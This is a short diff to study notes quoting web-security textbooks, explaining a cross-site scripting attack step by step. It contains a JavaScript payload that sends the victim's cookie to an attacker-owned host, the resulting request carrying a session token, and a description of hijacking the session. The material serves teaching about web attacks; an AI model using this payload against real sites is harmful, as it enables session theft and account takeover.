@@ -19,5 +19,8 @@ Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 54
 var i=new Image; i.src="http://mdattacker.net/"+document.cookie;
  This code causes the user's browser to make a request to mdattacker.net which is a domain owned by the attacker. 
  The request contains the user's current session token for the application:
+  GET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
+  Host: mdattacker.net
+ 7. The attacker monitors requests to mdattacker.net and receives the user's request. He uses the captured token to hijack the user's session, gaining access to that user's personal information and performing arbitrary actions “as” the user.
 
 Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11652-11656). Wiley. Kindle Edition. 
